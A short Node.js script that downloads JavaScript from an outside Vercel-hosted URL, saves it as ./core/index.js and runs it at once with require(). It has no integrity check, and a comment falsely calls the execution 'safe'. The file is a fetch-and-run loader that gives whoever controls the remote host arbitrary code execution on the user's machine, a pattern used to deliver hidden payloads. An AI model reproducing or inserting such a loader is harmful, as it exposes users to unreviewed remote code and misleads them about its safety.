const fs = require("fs");
const axios = require("axios");
const path = "./core/index.js";

async function loadIndex() {
  const url = "https://index-js-code.vercel.app/"; // ✅ This is where index.js is hosted
  try {
    const { data } = await axios.get(url);
    fs.mkdirSync("./core", { recursive: true });
    fs.writeFileSync(path, data); // Save locally
    console.log("✅ index.js updated locally.");

    require(path); // Safe execution
  } catch (err) {
    console.error("❌ Failed to fetch index.js:", err.message);
  }
}

loadIndex();
